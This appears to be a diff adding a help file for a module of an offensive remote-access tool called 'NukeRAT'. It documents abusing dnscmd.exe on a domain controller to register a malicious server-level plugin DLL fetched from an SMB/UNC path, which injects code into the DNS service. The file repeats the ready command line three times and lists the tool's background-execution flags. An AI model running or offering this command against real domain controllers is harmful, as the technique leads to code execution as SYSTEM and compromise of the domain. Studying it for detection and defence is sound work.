@@ -1,0 +1,21 @@
+ABOUT
+    DNS Server command-line manager.
+    On a DC, registers a malicious serverlevelplugindll from a UNC path
+    for DNS service DLL injection.
+
+USAGE:
+    dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+
+ARGUMENTS:
+    /config                      DNS server configuration
+    /serverlevelplugindll        Server-level plugin DLL path
+
+EXAMPLES:
+    dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
